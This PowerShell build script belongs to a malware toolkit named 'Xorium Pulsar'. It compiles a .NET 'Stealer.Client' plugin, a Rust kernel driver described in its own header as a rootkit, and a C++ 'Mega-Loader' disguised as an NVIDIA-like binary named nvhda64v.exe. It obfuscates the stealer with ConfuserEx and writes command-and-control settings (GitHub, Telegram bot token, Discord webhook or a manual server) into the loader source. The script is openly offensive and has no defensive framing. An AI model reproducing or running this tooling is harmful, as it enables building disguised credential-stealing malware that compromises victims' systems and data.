<#
.SYNOPSIS
    XORIUM PULSAR - ULTIMATE BUILD ENGINE
    High-Performance Build Script with Enhanced UX/UI
.DESCRIPTION
    Compiles .NET Plugin, Rust Rootkit, and C++ Loader.
    Features automated obfuscation, C2 configuration, and error handling.
#>

param(
    [switch]$SkipObfuscation,
    [switch]$Fast,
    [switch]$VerboseLog
)

# -----------------------------------------------------------------------------
# GLOBAL CONFIGURATION
# -----------------------------------------------------------------------------
$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"
$Script:BuildRoot = $PSScriptRoot
$Script:DistDir = Join-Path $BuildRoot "dist"
$Script:ShadowDir = Join-Path $BuildRoot "shadow-main"
$Script:PluginProj = Join-Path $BuildRoot "Pulsar.Plugin.Client\Stealer.Client\Stealer.Client.csproj"
$Script:ConfuserPath = Join-Path $BuildRoot "ConfuserEx-CLI\Confuser.CLI.exe"
$Script:LoaderSrc = Join-Path $BuildRoot "AbyssNative.cpp"
$Script:LoaderExe = "nvhda64v.exe"

# -----------------------------------------------------------------------------
# UI / UX HELPERS
# -----------------------------------------------------------------------------
function Write-Color {
    param(
        [string]$Text,
        [ConsoleColor]$Color = [ConsoleColor]::White,
        [switch]$NoNewLine
    )
    Write-Host $Text -ForegroundColor $Color -NoNewline:$NoNewLine
}

function Show-Header {
    Clear-Host
    $cyan = "Cyan"
    $magenta = "Magenta"
    $white = "White"
    
    Write-Color "    __  ______  ____  ____  __  ____  ___ " $cyan
    Write-Color "   /  |/  /   |/ __ \/ __ \/ / / / / / / " $cyan
    Write-Color "  / /|_/ / /| / /_/ / /_/ / / / / / / /  " $magenta
    Write-Color " / /  / / ___ / _, _/ _, _/ /_/ / /_/ /   " $magenta
    Write-Color "/_/  /_/_/  |/_/ |_/_/ |_|\____/\____/    " $white
    Write-Color "                                         " $white
    Write-Color "   X O R I U M   P U L S A R   v 4 . 0   " $cyan
    Write-Color "   -----------------------------------   " $magenta
    Write-Host ""
}

function Show-Section {
    param([string]$Title)
    Write-Host ""
    Write-Color ">> " "Magenta" -NoNewLine
    Write-Color "$Title" "White"
    Write-Color "---------------------------------------------------------------------------" "DarkGray"
}

function Show-Success {
    param([string]$Message)
    Write-Color "  [v] " "Green" -NoNewline
    Write-Color "$Message" "Gray"
}

function Show-Error {
    param([string]$Message)
    Write-Color "  [x] " "Red" -NoNewline
    Write-Color "$Message" "Red"
}

function Show-Info {
    param([string]$Message)
    Write-Color "  [i] " "Cyan" -NoNewline
    Write-Color "$Message" "Gray"
}

function Show-Warning {
    param([string]$Message)
    Write-Color "  [!] " "Yellow" -NoNewline
    Write-Color "$Message" "Yellow"
}

function Invoke-Spinner {
    param(
        [scriptblock]$Action,
        [string]$Message
    )
    
    $sp = $null
    $job = Start-Job -ScriptBlock $Action
    $anim = "|", "/", "-", "\"
    $i = 0
    
    Write-Color "  [*] " "Cyan" -NoNewline
    Write-Color "$Message" "Gray" -NoNewline
    
    try {
        while ($job.State -eq "Running") {
            Write-Host "`b" -NoNewline
            Write-Host $anim[$i % 4] -ForegroundColor Cyan -NoNewline
            Start-Sleep -Milliseconds 100
            $i++
        }
        Write-Host "`b" -NoNewline
        
        $results = Receive-Job -Job $job
        if ($job.State -eq "Failed") {
            throw $job.ChildJobs[0].Error
        }
        return $results
    }
    catch {
        Write-Host " " -NoNewline
        Show-Error "Failed during: $Message"
        Write-Error $_
        return $null
    }
    finally {
        Remove-Job $job -Force
    }
}

# -----------------------------------------------------------------------------
# CORE FUNCTIONS
# -----------------------------------------------------------------------------

function Clean-Workspace {
    Show-Section "CLEANING WORKSPACE"
    if (Test-Path $Script:DistDir) {
        Remove-Item $Script:DistDir -Recurse -Force -ErrorAction SilentlyContinue
        Show-Success "Removed old dist directory."
    }
    New-Item -Path $Script:DistDir -ItemType Directory -Force | Out-Null
    Show-Success "Created new dist directory."
}

function Config-C2 {
    Show-Section "C2 CONFIGURATION"
    
    Write-Color "  Select C2 Architecture:" "Cyan"
    Write-Host "    [1] " -NoNewline -ForegroundColor Green; Write-Host "GitHub"
    Write-Host "    [2] " -NoNewline -ForegroundColor Green; Write-Host "Telegram"
    Write-Host "    [3] " -NoNewline -ForegroundColor Green; Write-Host "Discord"
    Write-Host "    [4] " -NoNewline -ForegroundColor Green; Write-Host "Manual (IP/DNS)"
    Write-Host "    [5] " -NoNewline -ForegroundColor Green; Write-Host "Dystopia (Auto)"
    Write-Host "    [Enter] " -NoNewline -ForegroundColor DarkGray; Write-Host "Skip"
    
    $choice = Read-Host "`n  > Choice"
    
    $c2 = @{ Type = "NONE"; Val1 = ""; Val2 = "" }
    
    switch ($choice) {
        "1" { $c2.Type = "GITHUB"; $c2.Val1 = Read-Host "    Enter GitHub Raw Link" }
        "2" { $c2.Type = "TELEGRAM"; $c2.Val1 = Read-Host "    Enter Bot Token"; $c2.Val2 = Read-Host "    Enter Chat ID" }
        "3" { $c2.Type = "DISCORD"; $c2.Val1 = Read-Host "    Enter Webhook URL" }
        "4" { $c2.Type = "MANUAL"; $c2.Val1 = Read-Host "    Enter Server Address" }
        "5" {
            $c2.Type = "DYSTOPIA"
            $mode = Read-Host "    Mode (1: Discord, 2: Telegram)"
            if ($mode -eq "2") {
                $c2.Val1 = Read-Host "    Enter Bot Token"
                $c2.Val2 = Read-Host "    Enter Chat ID"
            } else {
                $c2.Val1 = Read-Host "    Enter Discord Webhook"
            }
        }
    }
    return $c2
}

function Build-Plugin {
    Show-Section "BUILDING .NET PLUGIN"
    
    $log = Join-Path $Script:DistDir "build_plugin.log"
    $args = "publish `"$Script:PluginProj`" -c Release -o `"$Script:DistDir`" /p:PublishSingleFile=true /p:SelfContained=false /p:DebugType=None /p:DebugSymbols=false"
    
    Write-Host "  [*] Compiling..." -NoNewline -ForegroundColor Cyan
    $process = Start-Process "dotnet" -ArgumentList $args -NoNewWindow -Wait -PassThru -RedirectStandardOutput $log
    
    # Check both exit code and output file existence
    $publishedExe = Join-Path $Script:DistDir "nvhda64v.exe"
    $publishedDll = Join-Path $Script:DistDir "nvhda64v.dll"
    
    if ((Test-Path $publishedExe) -or (Test-Path $publishedDll)) {
        Write-Host "`r  [v] Compiling... Done" -ForegroundColor Green
        
        $inner = Join-Path $Script:DistDir "nvhda64v_inner.exe"
        
        if (Test-Path $publishedExe) {
            Move-Item $publishedExe $inner -Force
        } else {
            Move-Item $publishedDll $inner -Force
        }
        
        if (-not $SkipObfuscation -and (Test-Path $Script:ConfuserPath)) {
            Write-Host "  [*] Obfuscating..." -NoNewline -ForegroundColor Cyan
            $obfDir = Join-Path $Script:DistDir "obf_temp"
            & $Script:ConfuserPath -n -o $obfDir $inner | Out-Null
            
            if (Test-Path (Join-Path $obfDir "nvhda64v_inner.exe")) {
                Move-Item (Join-Path $obfDir "nvhda64v_inner.exe") $inner -Force
                Write-Host "`r  [v] Obfuscating... Done" -ForegroundColor Green
            }
            Remove-Item $obfDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    } else {
        Write-Host "`r  [x] Compiling... Failed" -ForegroundColor Red
        Show-Error "Check $log for details."
        exit 1
    }
}

function Build-RustDriver {
    Show-Section "BUILDING KERNEL DRIVER"
    
    if (-not (Get-Command "rustc" -ErrorAction SilentlyContinue)) {
        Show-Warning "Rust not installed. Skipping driver build."
        return
    }
    
    $driverSrcDir = $Script:ShadowDir
    # The build artifact may be in a target-specific folder on Windows
    $driverTargetDll = Join-Path $driverSrcDir "target\x86_64-pc-windows-msvc\release\shadow_core.dll"
    $driverFallbackDll = Join-Path $driverSrcDir "target\release\shadow_core.dll"
    
    if (-not (Test-Path $driverTargetDll) -and -not (Test-Path $driverFallbackDll)) {
        Show-Info "Shadow Driver not found. Compiling..."
        Push-Location $driverSrcDir
        try {
            $res = & cargo build --release --package shadow_core 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) {
                Write-Host "`r  [x] Compiling Driver... Failed" -ForegroundColor Red
                Show-Error $res
                return
            }
            Write-Host "`r  [v] Compiling Driver... Done" -ForegroundColor Green
        }
        catch {
            Show-Error "Unexpected error: $_"
            return
        }
        finally {
            Pop-Location
        }
    }

    $finalDriver = if (Test-Path $driverTargetDll) { $driverTargetDll } else { $driverFallbackDll }

    if (Test-Path $finalDriver) {
        # Copy as .sys for the loader to find
        Copy-Item $finalDriver (Join-Path $Script:DistDir "shadow_core.sys") -Force
        Show-Success "Driver Signed & Ready."
    } else {
        Show-Error "Driver build artifact missing after compilation (checked: $driverTargetDll)."
    }
}

function Build-MegaLoader {
    param($C2Config)
    Show-Section "ASSEMBLING MEGA-LOADER"
    
    # 1. Patch Source
    if ($C2Config.Type -ne "NONE") {
        $content = Get-Content $Script:LoaderSrc -Raw
        $content = $content -replace 'std::string C2_URL = ".*";', "std::string C2_URL = `"$($C2Config.Val1)`";"
        $content = $content -replace 'std::string C2_VAL2 = ".*";', "std::string C2_VAL2 = `"$($C2Config.Val2)`";"
        $content = $content -replace 'std::string C2_TYPE = ".*";', "std::string C2_TYPE = `"$($C2Config.Type)`";"
        Set-Content $Script:LoaderSrc $content
        Show-Success "Patched AbyssNative.cpp with C2."
    }
    
    # 2. Find MSVC
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (Test-Path $vswhere) {
        $path = & $vswhere -latest -products * -property installationPath
        $vcVars = Join-Path $path "VC\Auxiliary\Build\vcvars64.bat"
        
        if (Test-Path $vcVars) {
            Write-Host "  [*] Linking (MSVC)..." -NoNewline -ForegroundColor Cyan
            
            $cmd = "`"$vcVars`" && call compile_abyss.bat"
            $output = cmd /c $cmd 2>&1
            
            if (Test-Path (Join-Path $Script:BuildRoot $Script:LoaderExe)) {
                Move-Item (Join-Path $Script:BuildRoot $Script:LoaderExe) (Join-Path $Script:DistDir $Script:LoaderExe) -Force
                Write-Host "`r  [v] Linking (MSVC)... Done" -ForegroundColor Green
                Show-Success "Mega-Loader Artifact Created."
            } else {
                 Write-Host "`r  [x] Linking (MSVC)... Failed" -ForegroundColor Red
                 Show-Error "Compilation failed. Output:"
                 Write-Host $output -ForegroundColor Red
            }
        } else {
            Show-Error "vcvars64.bat not found."
        }
    } else {
        Show-Error "Visual Studio not found."
    }
}

# -----------------------------------------------------------------------------
# MAIN EXECUTION
# -----------------------------------------------------------------------------
Show-Header
Clean-Workspace
$c2 = Config-C2
Build-Plugin
Build-RustDriver
Build-MegaLoader $c2

Show-Section "BUILD COMPLETE"
Show-Success "Artifact: $(Join-Path $Script:DistDir $Script:LoaderExe)"
Write-Host ""
Write-Color "  Press any key to exit..." "DarkGray"
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")